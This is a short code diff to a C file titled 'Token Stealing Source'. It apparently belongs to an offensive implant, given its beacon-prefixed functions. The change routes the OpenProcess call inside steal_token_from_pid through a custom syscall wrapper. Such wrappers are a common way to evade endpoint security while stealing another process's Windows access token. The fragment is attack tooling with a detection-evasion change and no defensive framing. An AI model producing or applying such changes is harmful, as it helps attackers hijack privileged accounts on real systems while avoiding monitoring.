@@ -2,6 +2,7 @@
  *  Token Stealing Source
  */ 
 #include <windows.h>
+#include "syscalls.h"
 #include <stdio.h>
 #include <tlhelp32.h>
 #include "tokens.h"
@@ -134,7 +135,7 @@ static BOOL steal_token_from_pid(int pid, DWORD access, HANDLE * out_token, char
 	if (access == 0)
 		access = TOKEN_ALL_ACCESS;
 
-	handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+	handle = beacon_OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
 	if (!handle) {
 		post_error_dd(0x21, pid, GetLastError());
 		return FALSE;
